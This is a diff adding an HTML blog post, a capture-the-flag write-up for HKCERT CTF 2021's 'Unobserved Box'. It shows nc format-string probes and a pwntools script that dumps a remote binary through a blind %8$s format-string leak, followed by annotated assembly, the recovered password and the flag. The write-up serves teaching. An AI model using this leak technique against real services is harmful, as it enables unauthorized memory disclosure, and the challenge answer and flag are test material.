@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en-uk">
+<title>[Pwn/Reverse] Unobserved Box (200 pts, 6 solves) | Blog by grhkm21</title>
+<meta charset="utf-8" />
+<meta name="generator" content="Hugo 0.87.0" />
+<meta
+    name="description"
+    content="Straightforward blind format string exploit followed by simple reverse engineering."
+/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="stylesheet" href="https://grhkm21.github.io/css/index.css"/>
+<link rel="stylesheet" href="https://grhkm21.github.io/css/toc.css"/>
+<link rel="stylesheet" href="https://grhkm21.github.io/css/spoiler.css" />
+<link rel="canonical" href="https://grhkm21.github.io/posts/hkcert-unobserved-box/" />
+<link rel="alternate" type="application/rss+xml" href="" title="Blog by grhkm21">
+
+<header>
+     
+    <nav>
+        
+        <a href="/">Home</a>
+        
+    </nav>
+    
+    <nav>
+        
+        <a href="/posts">Menu</a>
+        
+    </nav>
+    
+</header>
+
+<main>
+
+<article>
+  <header>
+    <h1>[Pwn/Reverse] Unobserved Box (200 pts, 6 solves)</h1>
+    <time datetime="2021-11-14T23:24:27Z">November 14, 2021</time>
+  </header>
+  <p>Source of the problem: <a href="https://platform.ctf.hkcert.org/challenges/32">HKCERT CTF 2021</a></p>
+<h2 id="problem-statement">Problem Statement</h2>
+<blockquote>
+<p>All codes are uncertain before the measurement, and you will never make it.</p>
+<p>Observe the code to get the flag.</p>
+<p><code>nc chalp.hkcert21.pwnable.hk 28132</code></p>
+</blockquote>
+<h2 id="solution-outline">Solution Outline</h2>
+<p>We dump the binary from 0x400000 to 0x405000 using format string and <code>%8$s</code>, then reverse engineer the <code>check</code> function for the flag.</p>
+<h2 id="initial-discoveries">Initial Discoveries</h2>
+<p>Let&rsquo;s have a look at the server:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">❯ nc chalp.hkcert21.pwnable.hk <span class="m">28132</span>
+AAAAAAAA
+AAAAAAAA is not the correct answer.
+
+❯ python3 -c <span class="s2">&#34;print(&#39;A&#39; \* 200)&#34;</span> <span class="p">|</span> nc chalp.hkcert21.pwnable.hk <span class="m">28132</span>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA is not the correct answer.
+
+❯ python3 -c <span class="s2">&#34;print(&#39;A&#39; \* 2000)&#34;</span> <span class="p">|</span> nc chalp.hkcert21.pwnable.hk <span class="m">28132</span>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA is not the correct answer.
+
+❯ python3 -c <span class="s2">&#34;print(&#39;%p|&#39; * 25)&#34;</span> <span class="p">|</span> nc chalp.hkcert21.pwnable.hk <span class="m">28132</span>
+0x7fffe0708a40<span class="p">|</span>0x7fffe0708a40<span class="p">|</span><span class="o">(</span>nil<span class="o">)</span><span class="p">|</span>0x7fcf5ced7d80<span class="p">|</span>0x7fcf5ced7d80<span class="p">|</span>0x70257c70257c7025<span class="p">|</span>0x257c70257c70257c<span class="p">|</span>0x7c70257c70257c70<span class="p">|</span>0x257c70257c7025<span class="p">|</span>0x401490<span class="p">|</span> is not the correct answer.
+</code></pre></div><p>Woah, we just found a format string vulnerability!</p>
+<h2 id="dumping-binary">Dumping Binary</h2>
+<p>With the format string vulnerability, let&rsquo;s tweak it to point to our input:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">❯ python3 -c <span class="s2">&#34;print(&#39;%p&#39; + &#39;|&#39; + &#39;A&#39; * 20)&#34;</span> <span class="p">|</span> nc chalp.hkcert21.pwnable.hk <span class="m">28132</span>
+0x7ffc5c5ede60<span class="p">|</span>AAAAAAAAAAAAAAAAAAAA is not the correct answer.
+
+❯ python3 -c <span class="s2">&#34;print(&#39;%1\$p&#39; + &#39;|&#39; + &#39;A&#39; * 20)&#34;</span> <span class="p">|</span> nc chalp.hkcert21.pwnable.hk <span class="m">28132</span>
+0x7fffebbd6ef0<span class="p">|</span>AAAAAAAAAAAAAAAAAAAA is not the correct answer.
+
+...
+
+❯ python3 -c <span class="s2">&#34;print(&#39;%8\$p&#39; + &#39;|&#39; + &#39;A&#39; * 20)&#34;</span> <span class="p">|</span> nc chalp.hkcert21.pwnable.hk <span class="m">28132</span>
+0x4141414141414141<span class="p">|</span>AAAAAAAAAAAAAAAAAAAA is not the correct answer.
+</code></pre></div><p>So now that our format string <code>%8$p</code> points to the input, how about we write an address to it? More importantly, we know that 64-bit code segments usually start at 0x400000, so we can explore that:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">❯ python3 -c <span class="s2">&#34;print(&#39;%8\$p&#39; + &#39;|&#39; + &#39;ABCDEFGHIJKLMNOPQRST&#39;)&#34;</span> <span class="p">|</span> nc chalp.hkcert21.pwnable.hk <span class="m">28132</span>
+0x535251504f4e4d4c<span class="p">|</span>ABCDEFGHIJKLMNOPQRST is not the correct answer.
+
+<span class="c1"># 0x53 -&gt; S, 0x4c -&gt; L</span>
+❯ python3 -c <span class="s2">&#34;print(&#39;%8\$p&#39; + &#39;|&#39; + &#39;ABCDEFGHIJK________&#39;)&#34;</span> <span class="p">|</span> nc chalp.hkcert21.pwnable.hk <span class="m">28132</span>
+0x5f5f5f5f5f5f5f5f<span class="p">|</span>ABCDEFGHIJK________ is not the correct answer.
+
+❯ python3 -c <span class="s2">&#34;print(&#39;%8\$p&#39; + &#39;|&#39; + &#39;ABCDEFGHIJK\x00\x00\x40\x00\x00\x00\x00\x00&#39;)&#34;</span> <span class="p">|</span> nc chalp.hkcert21.pwnable.hk <span class="m">28132</span>
+0x400000<span class="p">|</span>ABCDEFGHIJK is not the correct answer.
+</code></pre></div><p>Great, now note that the <code>$s</code> format provides functionality to output the string at the location. So for example in the last command above, if we replace <code>%8$p</code> with <code>%8$s</code>, we would get:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># the magic header has appeared</span>
+❯ python3 -c <span class="s2">&#34;print(&#39;%8\$p&#39; + &#39;|&#39; + &#39;ABCDEFGHIJK\x00\x00\x40\x00\x00\x00\x00\x00&#39;)&#34;</span> <span class="p">|</span> nc chalp.hkcert21.pwnable.hk <span class="m">28132</span>
+ELF<span class="p">|</span>ABCDEFGHIJK is not the correct answer.
+
+❯ python3 -c <span class="s2">&#34;print(&#39;%8\$s&#39; + &#39;|&#39; + &#39;ABCDEFGHIJK\x00\x00\x40\x00\x00\x00\x00\x00&#39;)&#34;</span> <span class="p">|</span> nc chalp.hkcert21.pwnable.hk <span class="m">28132</span> <span class="p">|</span> hexdump -C
+<span class="m">00000000</span>  7f <span class="m">45</span> 4c <span class="m">46</span> <span class="m">02</span> <span class="m">01</span> <span class="m">01</span> 7c  <span class="m">41</span> <span class="m">42</span> <span class="m">43</span> <span class="m">44</span> <span class="m">45</span> <span class="m">46</span> <span class="m">47</span> <span class="m">48</span>  <span class="p">|</span>.ELF...<span class="p">|</span>ABCDEFGH<span class="p">|</span>
+<span class="m">00000010</span>  <span class="m">49</span> 4a 4b <span class="m">20</span> <span class="m">69</span> <span class="m">73</span> <span class="m">20</span> 6e  6f <span class="m">74</span> <span class="m">20</span> <span class="m">74</span> <span class="m">68</span> <span class="m">65</span> <span class="m">20</span> <span class="m">63</span>  <span class="p">|</span>IJK is not the c<span class="p">|</span>
+<span class="m">00000020</span>  6f <span class="m">72</span> <span class="m">72</span> <span class="m">65</span> <span class="m">63</span> <span class="m">74</span> <span class="m">20</span> <span class="m">61</span>  6e <span class="m">73</span> <span class="m">77</span> <span class="m">65</span> <span class="m">72</span> 2e 0a     <span class="p">|</span>orrect answer..<span class="p">|</span>
+0000002f
+
+<span class="c1"># remember - 64-bit systems!</span>
+❯ python3 -c <span class="s2">&#34;print(&#39;%8\$s&#39; + &#39;|&#39; + &#39;ABCDEFGHIJK\x00\x00\x40\x00\x00\x00\x00\x00&#39;)&#34;</span> <span class="p">|</span> nc chalp.hkcert21.pwnable.hk <span class="m">28132</span> <span class="p">|</span> python3 -c <span class="s2">&#34;print(input().split(&#39;|&#39;)[0], end=&#39;&#39;)&#34;</span> <span class="p">|</span> hexdump -C
+<span class="m">00000000</span>  7f <span class="m">45</span> 4c <span class="m">46</span> <span class="m">02</span> <span class="m">01</span> <span class="m">01</span>                              <span class="p">|</span>.ELF...<span class="p">|</span>
+<span class="m">00000007</span>
+</code></pre></div><p>Hurray! Since strings are terminated by null-bytes, we also know that the byte after the output is a null byte, and we can continue at that address and repeat.</p>
+<p>(Note: if there is no output, which is the case for address 0x400008)</p>
+<p>There are a few other issues to address. An important one is when the address contains <code>\x0a</code>, more commonly known as <code>\n</code>, the print statement will output a newline and the server skips the part afterwards. I simply skip over them, which shouldn&rsquo;t cause too much of a problem - just a single byte replaced with a null byte.</p>
+<p>Now let&rsquo;s put this all into one python script:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;WARNING&#39;</span>
+
+<span class="n">conn</span> <span class="o">=</span> <span class="kc">None</span>
+<span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="s1">&#39;chalp.hkcert21.pwnable.hk&#39;</span><span class="p">,</span> <span class="mi">28132</span>
+
+
+<span class="k">def</span> <span class="nf">init</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">conn</span>
+    <span class="k">if</span> <span class="n">conn</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">dump</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
+    <span class="c1"># Turn 0x400102 into b&#39;\x02\x01\x40\x00\x00\x00\x00\x00&#39;</span>
+    <span class="n">bddr</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">16</span><span class="p">))[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+    <span class="c1"># Handling special case: &#39;\n&#39;</span>
+    <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="ow">in</span> <span class="n">bddr</span><span class="p">:</span>
+        <span class="k">return</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
+    <span class="c1"># Then construct payload: [fs]|[pad][bddr]</span>
+    <span class="n">fs</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;%8$s&#39;</span>
+    <span class="n">pad</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;ABCDEFGHIJK&#39;</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">fs</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;|&#39;</span> <span class="o">+</span> <span class="n">pad</span> <span class="o">+</span> <span class="n">bddr</span>
+    <span class="c1"># send it!</span>
+    <span class="n">init</span><span class="p">()</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;|&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[*] </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="si">}</span><span class="s1"> =&gt; </span><span class="si">{</span><span class="n">response</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">response</span>
+
+
+<span class="n">addr</span> <span class="o">=</span> <span class="mh">0x400000</span>
+<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+    <span class="c1"># append, bytes</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;dump&#39;</span><span class="p">,</span> <span class="s1">&#39;ab&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fout</span><span class="p">:</span>
+        <span class="c1"># ends at null byte</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">dump</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span>
+        <span class="n">addr</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
+        <span class="n">fout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
+        <span class="n">fout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+</code></pre></div><p>The next step is to let the code run zzz&hellip;</p>
+<p>You can download <a href="https://github.com/grhkm21/grhkm21.github.io/files/dump">the binary</a> I got.</p>
+<h2 id="reverse-engineering">Reverse Engineering</h2>
+<p>Once we have sufficient amount of the binary, we can open it in IDA or other tools. Looking around,
+we find what seems to be the check function:</p>
+<p><img src="/images/unobserved-box-ida.png/" alt="Scary for a crypto one-trick!"></p>
+<p>Each block is relatively simple, and we can go through them one by one. Just a trick in general - not everything has to be carefully checked and rigorous. Looking through the code and cracking it took us one minute - guess and hand-waving work is key!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">push</span>    <span class="no">rbp</span>
+<span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
+<span class="nf">sub</span>     <span class="no">rsp</span><span class="p">,</span> <span class="mi">10</span><span class="no">h</span>
+<span class="nf">mov</span>     <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="no">var_8</span><span class="p">],</span> <span class="no">rdi</span>
+<span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="no">var_8</span><span class="p">]</span>    <span class="c"># [rdp+var_8] is our input string (s)
+</span><span class="c"></span><span class="no">mov</span>     <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
+<span class="nf">call</span>    <span class="no">sub_401060</span>          <span class="c"># some libc function with a string parameter - len!
+</span><span class="c"></span><span class="no">cmp</span>     <span class="no">rax</span><span class="p">,</span> <span class="mi">13</span><span class="no">h</span>            <span class="c"># [1] len(s) == 19 (0x13)
+</span><span class="c"></span><span class="no">jz</span>      <span class="no">short</span> <span class="no">loc_4011BA</span>
+
+<span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="no">var_8</span><span class="p">]</span>
+<span class="nf">add</span>     <span class="no">rax</span><span class="p">,</span> <span class="mi">6</span>              <span class="c"># s[6]
+</span><span class="c"></span><span class="no">movzx</span>   <span class="no">eax</span><span class="p">,</span> <span class="no">byte</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span>
+<span class="nf">cmp</span>     <span class="no">al</span><span class="p">,</span> <span class="mi">5</span><span class="no">Fh</span>             <span class="c"># [2] s[6] == &#39;_&#39; (0x5f)
+</span><span class="c"></span><span class="no">jnz</span>     <span class="no">short</span> <span class="no">loc_4011E3</span>
+
+<span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="no">var_8</span><span class="p">]</span>
+<span class="nf">add</span>     <span class="no">rax</span><span class="p">,</span> <span class="mi">9</span>
+<span class="nf">movzx</span>   <span class="no">edx</span><span class="p">,</span> <span class="no">byte</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span> <span class="c"># edx = s[9]
+</span><span class="c"></span><span class="no">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="no">var_8</span><span class="p">]</span>
+<span class="nf">add</span>     <span class="no">rax</span><span class="p">,</span> <span class="mi">6</span>
+<span class="nf">movzx</span>   <span class="no">eax</span><span class="p">,</span> <span class="no">byte</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span> <span class="c"># eax = s[6]
+</span><span class="c"></span><span class="no">cmp</span>     <span class="no">dl</span><span class="p">,</span> <span class="no">al</span>              <span class="c"># [3] s[6] == s[9]
+</span><span class="c"></span><span class="no">jz</span>      <span class="no">short</span> <span class="no">loc_4011ED</span>
+
+<span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="no">var_8</span><span class="p">]</span>
+<span class="nf">mov</span>     <span class="no">edx</span><span class="p">,</span> <span class="mi">6</span>
+<span class="nf">lea</span>     <span class="no">rsi</span><span class="p">,</span> <span class="no">aPrintf_0</span>  <span class="c">; &#34;printf&#34; # aww IDA is so nice
+</span><span class="c"></span><span class="no">mov</span>     <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
+<span class="nf">call</span>    <span class="no">sub_401040</span>          <span class="c"># some libc function with two string parameters (one is constant)
+</span><span class="c"></span><span class="no">test</span>    <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>            <span class="c"># probably strcmp
+</span><span class="c"></span><span class="no">jz</span>      <span class="no">short</span> <span class="no">loc_401213</span>    <span class="c"># [4] s[:6] == &#34;printf&#34;
+</span><span class="c"></span>
+<span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="no">var_8</span><span class="p">]</span>
+<span class="nf">add</span>     <span class="no">rax</span><span class="p">,</span> <span class="mi">0</span><span class="no">Ah</span>            <span class="c"># start at s[10]
+</span><span class="c"></span><span class="no">mov</span>     <span class="no">edx</span><span class="p">,</span> <span class="mi">6</span>
+<span class="nf">lea</span>     <span class="no">rsi</span><span class="p">,</span> <span class="no">aDanger</span>    <span class="c">; &#34;danger&#34;
+</span><span class="c"></span><span class="no">mov</span>     <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
+<span class="nf">call</span>    <span class="no">sub_401040</span>
+<span class="nf">test</span>    <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>            <span class="c"># [5] s[10:16] == &#34;danger&#34;
+</span><span class="c"></span><span class="no">jz</span>      <span class="no">short</span> <span class="no">loc_40123D</span>
+
+<span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="no">var_8</span><span class="p">]</span>
+<span class="nf">add</span>     <span class="no">rax</span><span class="p">,</span> <span class="mi">12</span><span class="no">h</span>
+<span class="nf">movzx</span>   <span class="no">eax</span><span class="p">,</span> <span class="no">byte</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span>
+<span class="nf">cmp</span>     <span class="no">al</span><span class="p">,</span> <span class="mi">73</span><span class="no">h</span>             <span class="c"># [6] s[18] == &#39;s&#39;
+</span><span class="c"></span><span class="no">jz</span>      <span class="no">short</span> <span class="no">loc_401253</span>
+
+<span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="no">var_8</span><span class="p">]</span>
+<span class="nf">add</span>     <span class="no">rax</span><span class="p">,</span> <span class="mi">11</span><span class="no">h</span>
+<span class="nf">movzx</span>   <span class="no">eax</span><span class="p">,</span> <span class="no">byte</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span>
+<span class="nf">cmp</span>     <span class="no">al</span><span class="p">,</span> <span class="mi">75</span><span class="no">h</span>             <span class="c"># [7] s[17] == &#39;u&#39;
+</span><span class="c"></span><span class="no">jz</span>      <span class="no">short</span> <span class="no">loc_401269</span>
+
+<span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="no">var_8</span><span class="p">]</span>
+<span class="nf">add</span>     <span class="no">rax</span><span class="p">,</span> <span class="mi">10</span><span class="no">h</span>
+<span class="nf">movzx</span>   <span class="no">eax</span><span class="p">,</span> <span class="no">byte</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span>
+<span class="nf">cmp</span>     <span class="no">al</span><span class="p">,</span> <span class="mi">6</span><span class="no">Fh</span>             <span class="c"># [8] s[16] == &#39;o&#39;
+</span><span class="c"></span><span class="no">jz</span>      <span class="no">short</span> <span class="no">loc_40127F</span>
+
+<span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="no">var_8</span><span class="p">]</span>
+<span class="nf">add</span>     <span class="no">rax</span><span class="p">,</span> <span class="mi">2</span>
+<span class="nf">movzx</span>   <span class="no">edx</span><span class="p">,</span> <span class="no">byte</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span>
+<span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="no">var_8</span><span class="p">]</span>
+<span class="nf">add</span>     <span class="no">rax</span><span class="p">,</span> <span class="mi">7</span>
+<span class="nf">movzx</span>   <span class="no">eax</span><span class="p">,</span> <span class="no">byte</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span>
+<span class="nf">cmp</span>     <span class="no">dl</span><span class="p">,</span> <span class="no">al</span>               <span class="c"># [9] s[2] == s[7]
+</span><span class="c"></span><span class="no">jz</span>      <span class="no">short</span> <span class="no">loc_4012A0</span>
+
+<span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="no">var_8</span><span class="p">]</span>
+<span class="nf">add</span>     <span class="no">rax</span><span class="p">,</span> <span class="mi">8</span>
+<span class="nf">movzx</span>   <span class="no">edx</span><span class="p">,</span> <span class="no">byte</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span>
+<span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="no">var_8</span><span class="p">]</span>
+<span class="nf">add</span>     <span class="no">rax</span><span class="p">,</span> <span class="mi">12</span><span class="no">h</span>
+<span class="nf">movzx</span>   <span class="no">eax</span><span class="p">,</span> <span class="no">byte</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span>
+<span class="nf">cmp</span>     <span class="no">dl</span><span class="p">,</span> <span class="no">al</span>               <span class="c"># [10] s[8] == s[18]
+</span><span class="c"></span><span class="no">jz</span>      <span class="no">short</span> <span class="no">loc_4012C1</span>
+</code></pre></div><p>Putting them together, we have:</p>
+<pre><code>len(s) == 19
+s[6] == '_'
+s[6] == s[9]
+s[:6] == &quot;printf&quot;
+s[10:16] == &quot;danger&quot;
+s[18] == 's'
+s[17] == 'u'
+s[16] == 'o'
+s[2] == s[7]
+s[8] == s[18]
+</code></pre><p>No, don&rsquo;t start writing a z3 solver script yet. Get your pen and paper and try it out!</p>
+<p>Finally, we get that <code>s == printf_is_dangerous</code>. Supplying it to the remote server gives</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">❯ <span class="nb">echo</span> printf_is_dangerous <span class="p">|</span> nc chalp.hkcert21.pwnable.hk <span class="m">28132</span>
+hkcert21<span class="o">{</span>l3akinG_the_world_giVE_U_7H3_FLAG<span class="o">}</span>
+</code></pre></div><p>Flag: <code>hkcert21{l3akinG_the_world_giVE_U_7H3_FLAG}</code></p>
+<h2 id="extra-material">Extra Material</h2>
+<p>If this is your first time seeing blind format string, here are some good writeups from previous challenges:</p>
+<ul>
+<li><a href="https://www.youtube.com/watch?v=XuzuFUGuQv0">33C3CTF ESPR</a> by LiveOverflow</li>
+<li><a href="https://www.da.vidbuchanan.co.uk/blog/HITB-XCTF-2018-babypwn.html">HITB-XCTF GSEC 2018</a> by David Buchanan</li>
+</ul>
+
+</article>
+
+
+    
+</main>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS_CHTML"></script>
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+tex2jax: {
+inlineMath: [['$','$'], ['\\(','\\)']],
+processEscapes: true},
+jax: ["input/TeX","input/MathML","input/AsciiMath","output/CommonHTML"],
+extensions: ["tex2jax.js","mml2jax.js","asciimath2jax.js","MathMenu.js","MathZoom.js","AssistiveMML.js", "[Contrib]/a11y/accessibility-menu.js"],
+TeX: {
+extensions: ["AMSmath.js","AMSsymbols.js","noErrors.js","noUndefined.js"],
+equationNumbers: {
+autoNumber: "AMS"
+}
+}
+});
+</script>
+
+</html>
